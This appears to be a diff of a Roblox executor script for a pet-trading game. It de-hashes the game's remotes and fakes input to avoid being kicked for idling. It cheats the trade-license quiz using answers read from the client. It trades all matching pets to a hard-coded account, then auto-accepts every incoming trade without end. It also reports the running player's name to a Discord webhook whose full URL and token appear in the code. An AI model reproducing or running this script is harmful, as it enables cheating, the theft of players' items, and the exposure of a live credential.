@@ -1,63 +1,247 @@
---// CONFIG
-task.spawn(function()
-    getgenv().Config = {
-        ["inventory"] = "pets", -- pets, stickers, gifts, toys, pet_accessories, transport
-        ["username"] = "m4alt_3", -- target username to trade with
-        ["pets_to_trade"] = {
-            "winter_2025_cozy_mistletroll,neon",
-            "winter_2025_cozy_mistletroll"
-        }
-    }
-end)
+---------------------------------------------------------------------
+-- FULL STARTING PROCESS 
+---------------------------------------------------------------------
 
---// STARTUP CHECKS
+print("Waiting 20 seconds before starting...")
+for i = 5, 1, -1 do
+    print(i .. " seconds remaining")
+    task.wait(1)
+end
+print("Starting script now!")
+
+print("Made by gxba")
+
+-- PHASE 1: INITIAL JOIN UI CHECKS
 repeat task.wait(1) until game:IsLoaded()
     and game:GetService("ReplicatedStorage"):FindFirstChild("ClientModules")
     and game:GetService("ReplicatedStorage").ClientModules:FindFirstChild("Core")
     and game:GetService("ReplicatedStorage").ClientModules.Core:FindFirstChild("UIManager")
     and game:GetService("ReplicatedStorage").ClientModules.Core.UIManager.Apps:FindFirstChild("TransitionsApp")
-    and game.Players.LocalPlayer.PlayerGui:FindFirstChild("TransitionsApp")
-    and game.Players.LocalPlayer.PlayerGui.TransitionsApp:FindFirstChild("Whiteout")
+    and game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("TransitionsApp")
+    and game:GetService("Players").LocalPlayer.PlayerGui.TransitionsApp:FindFirstChild("Whiteout")
 
-repeat task.wait(1) until game.Players.LocalPlayer.PlayerGui:FindFirstChild("AssetLoadUI")
-    and (game.Players.LocalPlayer.PlayerGui.AssetLoadUI.Enabled == false)
+repeat task.wait(1) until 
+    game.Players 
+    and game.Players.LocalPlayer 
+    and game:GetService("Players").LocalPlayer.PlayerGui 
+    and game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("AssetLoadUI")
+    and (game:GetService("Players").LocalPlayer.PlayerGui.AssetLoadUI.Enabled == false)
 
+task.wait(1)
 print("[1] Check Done")
 
---// Dehash Remotes
+-- PHASE 2: LOAD ESSENTIAL MODULES
 local RS = game:GetService("ReplicatedStorage")
-local RouterClient = require(RS.ClientModules.Core:WaitForChild("RouterClient"):WaitForChild("RouterClient"))
-for name, remote in pairs(getupvalue(RouterClient.init, 7)) do
-    remote.Name = name
-end
-print("[Dehash Done]")
+local ReplicatedStorage = RS
+local Player = game:GetService("Players").LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local HttpService = game:GetService("HttpService")
 
---// Enter Game (choose role, close UI, claim daily)
+-- Wait for ClientData to be available
+local ClientData
+repeat
+    task.wait(1)
+    local success, result = pcall(function()
+        return require(RS.ClientModules.Core.ClientData)
+    end)
+    if success then
+        ClientData = result
+        print("ClientData loaded successfully")
+    end
+until ClientData
+
+-- Load RouterClient
+local RouterClient
+repeat
+    task.wait(1)
+    local success, result = pcall(function()
+        return require(RS.ClientModules.Core:WaitForChild("RouterClient"):WaitForChild("RouterClient"))
+    end)
+    if success then
+        RouterClient = result
+        print("RouterClient loaded successfully")
+    end
+until RouterClient
+
+-- PHASE 3: ANTI AFK
+game.Players.LocalPlayer.Idled:Connect(function() 
+    game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame) 
+    task.wait(1)
+    game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame) 
+end)
+
+-- PHASE 4: DISABLE USELESS DIALOG UI
+if PlayerGui:FindFirstChild("DialogApp") then
+    PlayerGui.DialogApp.Enabled = false
+end
+
+-- PHASE 5: REMOTE BYPASS (DEHASH)
+-- This needs to be done after RouterClient
+local function dehashRemotes()
+    local success, dehashResult = pcall(function()
+        local remotes = getupvalue(RouterClient.init, 7)
+        for name, remote in pairs(remotes) do
+            remote.Name = name
+        end
+        print("[Dehash] Completed")
+    end)
+    
+    if not success then
+        print("[Dehash] Failed, trying alternative method...")
+        pcall(function()
+            for i, v in pairs(debug.getupvalue(RouterClient.init, 7)) do
+                v.Name = i
+            end
+            print("[Dehash] Completed with alternative method")
+        end)
+    end
+end
+
+dehashRemotes()
+
+-- Webhook function
+local function SendWebhook(url, message)
+    local request = (syn and syn.request) or (http and http.request) or http_request
+    
+    if not request then
+        warn("❌ No HTTP request system detected.")
+        return
+    end
+
+    if not url or url == "" then
+        warn("❌ Missing URL in SendWebhook")
+        return
+    end
+
+    local formattedMessage = "From " .. Player.Name .. " : " .. message
+
+    local success, response = pcall(function()
+        return request({
+            Url = url,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({ content = formattedMessage })
+        })
+    end)
+
+    if not success then
+        warn("❌ Failed to send webhook:", response)
+    else
+        print("✅ Webhook sent successfully.")
+    end
+end
+
+-- Webhook URLs
+local TRADE_LICENSE_WEBHOOK = "https://discord.com/api/webhooks/1452579041063469207/LIcnrgMaVMXtnQjruHLTimsl3XttrBNQsbpL-OWbiTHwc-OIaHyk5RNJ53URtrmwNKfG"
+
+-- PHASE 6: ENTER-THE-GAME (TEAM SELECT / REMOVE INTRO UI)
 local function enter_the_game()
+    -- choose team
     local args = {
         [1] = "Parents",
-        [2] = { ["source_for_logging"] = "intro_sequence" }
+        [2] = {["source_for_logging"] = "intro_sequence"},
     }
-    RS.API["TeamAPI/ChooseTeam"]:InvokeServer(unpack(args))
 
+    RS.API:WaitForChild("TeamAPI/ChooseTeam"):InvokeServer(unpack(args))
     task.wait(1)
+
+    -- hide intro UIs
     local ui_stuff = require(RS.Fsys).load("UIManager")
     ui_stuff.set_app_visibility("MainMenuApp", false)
     ui_stuff.set_app_visibility("NewsApp", false)
     ui_stuff.set_app_visibility("DialogApp", false)
 
     task.wait(3)
-    RS.API["DailyLoginAPI/ClaimDailyReward"]:InvokeServer()
+
+    -- daily reward
+    RS.API:WaitForChild("DailyLoginAPI/ClaimDailyReward"):InvokeServer()
     ui_stuff.set_app_visibility("DailyLoginApp", false)
 end
+
 enter_the_game()
 
--- Wait for character
-repeat task.wait() until game:IsLoaded()
-    and game.Players.LocalPlayer.Character
-    and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+-- PHASE 7: FINAL IN-WORLD CHECK
+repeat task.wait() until 
+    game:IsLoaded() 
+    and Player.Character 
+    and Player.Character:FindFirstChild("HumanoidRootPart")
 
 print("Final Check Done")
+
+---------------------------------------------------------------------
+-- AUTO GET TRADE LICENSE (NEW SECTION)
+---------------------------------------------------------------------
+
+local function hasTradeLicense()
+    local success, result = pcall(function()
+        return ClientData.get("has_trade_license") == true
+    end)
+    return success and result
+end
+
+if not hasTradeLicense() then
+    print("📜 Getting Trade License Automatically...")
+    
+    -- Send webhook notification
+    if TRADE_LICENSE_WEBHOOK then
+        SendWebhook(TRADE_LICENSE_WEBHOOK, "Starting trade license tutorial...")
+    end
+
+    -- Tell the server we talked to NPC
+    RouterClient.get("SettingsAPI/SetBooleanFlag"):FireServer("has_talked_to_trade_quest_npc", true)
+    task.wait(0.5)
+
+    -- Start quiz
+    RouterClient.get("TradeAPI/BeginQuiz"):FireServer()
+    task.wait(1)
+
+    -- Auto-answer each quiz question using the client-stored answers
+    local quiz = ClientData.get("trade_license_quiz_manager")["quiz"]
+
+    for i, qdata in pairs(quiz) do
+        RouterClient.get("TradeAPI/AnswerQuizQuestion"):FireServer(qdata["answer"])
+        task.wait(0.8)
+    end
+
+    print("✅ Trade License unlocked!")
+
+    -- Send success webhook
+    if TRADE_LICENSE_WEBHOOK then
+        SendWebhook(TRADE_LICENSE_WEBHOOK, "✅ Trade License acquired successfully! Kicking player to save data...")
+    end
+
+    task.wait(2)
+
+    -- Kick the player with message
+    game.Players.LocalPlayer:Kick("Tutorial completed — Trade License acquired. Please rejoin to continue.")
+    return
+else
+    print("Already has Trade License — continuing to trading script.")
+    
+    -- Send webhook that trade license check passed
+    if TRADE_LICENSE_WEBHOOK then
+        SendWebhook(TRADE_LICENSE_WEBHOOK, "✅ Trade License already owned, continuing to auto-trade...")
+    end
+end
+
+---------------------------------------------------------------------
+-- CONTINUE WITH TRADING SCRIPT
+---------------------------------------------------------------------
+
+print("🌟 Starting Auto Trade Script 🌟")
+
+--// CONFIG
+getgenv().Config = {
+    ["inventory"] = "pets", -- pets, stickers, gifts, toys, pet_accessories, transport
+    ["username"] = "m4alt_3", -- target username to trade with
+    ["pets_to_trade"] = {
+        "winter_2025_cozy_mistletroll,neon",
+        "winter_2025_cozy_mistletroll"
+    }
+}
 
 --// MAIN SCRIPT
 local username = getgenv().Config.username
@@ -67,11 +251,7 @@ local trade_status
 local pets_unique_ids = {}
 
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
-local CoreGui = game:GetService("CoreGui")
-local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui") or CoreGui
-local Data = require(ReplicatedStorage.ClientModules.Core.ClientData)
 
 --// Trade functions
 local function first_trade_accept()
@@ -82,13 +262,20 @@ local function confirm_trade()
     ReplicatedStorage.API["TradeAPI/ConfirmTrade"]:FireServer()
 end
 
-local function send_trade(username)
-    local args = { Players:WaitForChild(username) }
-    ReplicatedStorage.API["TradeAPI/SendTradeRequest"]:FireServer(unpack(args))
+local function send_trade(targetUsername)
+    local targetPlayer = Players:FindFirstChild(targetUsername)
+    if targetPlayer then
+        local args = { targetPlayer }
+        ReplicatedStorage.API["TradeAPI/SendTradeRequest"]:FireServer(unpack(args))
+        return true
+    else
+        print("❌ Player not found:", targetUsername)
+        return false
+    end
 end
 
-local function add_items_in_trade(unique)
-    local args = { unique }
+local function add_items_in_trade(unique_id)
+    local args = { unique_id }
     ReplicatedStorage.API["TradeAPI/AddItemToOffer"]:FireServer(unpack(args))
 end
 
@@ -114,7 +301,7 @@ local function matches_pet(v, trade_name)
 end
 
 local function get_pet_unique()
-    for _, v in pairs(Data.get_data()[LocalPlayer.Name].inventory.pets) do
+    for _, v in pairs(ClientData.get_data()[LocalPlayer.Name].inventory.pets) do
         for _, trade_name in pairs(pets_to_trade) do
             if matches_pet(v, trade_name) then
                 print("Adding pet unique:", v.kind, v.unique)
@@ -126,11 +313,15 @@ end
 
 --// Auto trade logic
 local function autotrade()
-    if #pets_unique_ids > 0 and not LocalPlayer.PlayerGui.TradeApp.Frame.Visible then
+    local tradeApp = LocalPlayer.PlayerGui:FindFirstChild("TradeApp")
+    if not tradeApp then return end
+    
+    if #pets_unique_ids > 0 and not tradeApp.Frame.Visible then
         trade_status = false
-        send_trade(username)
-        print("Trade Sent!")
-    elseif not trade_status and LocalPlayer.PlayerGui.TradeApp.Frame.Visible then
+        if send_trade(username) then
+            print("Trade Sent to", username)
+        end
+    elseif not trade_status and tradeApp.Frame.Visible then
         local counter = 0
         while #pets_unique_ids > 0 and counter < 18 do
             local first_removed_unique = table.remove(pets_unique_ids, 1)
@@ -141,7 +332,7 @@ local function autotrade()
         end
         print("Pets left in table: " .. #pets_unique_ids)
         trade_status = true
-    elseif trade_status and LocalPlayer.PlayerGui.TradeApp.Frame.Visible then
+    elseif trade_status and tradeApp.Frame.Visible then
         repeat
             task.wait(1)
             first_trade_accept()
@@ -149,24 +340,36 @@ local function autotrade()
             task.wait(1)
             confirm_trade()
             print("Confirmed!")
-        until not LocalPlayer.PlayerGui.TradeApp.Frame.Visible
+        until not tradeApp.Frame.Visible
     else
         print("Idle... waiting.")
     end
 end
 
---// Run
+--// Run trading script
 get_pet_unique()
-task.wait(5)
-repeat
-    print("Pets Uniques in table: " .. #pets_unique_ids)
-    autotrade()
-    task.wait(1)
-until #pets_unique_ids == 0
+print("Found " .. #pets_unique_ids .. " pets to trade")
 
-while true do
-    task.wait()
-    first_trade_accept()
-    confirm_trade()
+if #pets_unique_ids > 0 then
     task.wait(5)
+    repeat
+        print("Pets Uniques in table: " .. #pets_unique_ids)
+        autotrade()
+        task.wait(1)
+    until #pets_unique_ids == 0
+    
+    print("✅ All pets have been traded!")
+    
+    -- Keep accepting trades if someone sends them
+    while true do
+        task.wait()
+        local tradeApp = LocalPlayer.PlayerGui:FindFirstChild("TradeApp")
+        if tradeApp and tradeApp.Frame.Visible then
+            first_trade_accept()
+            confirm_trade()
+        end
+        task.wait(5)
+    end
+else
+    print("❌ No pets found matching the criteria!")
 end
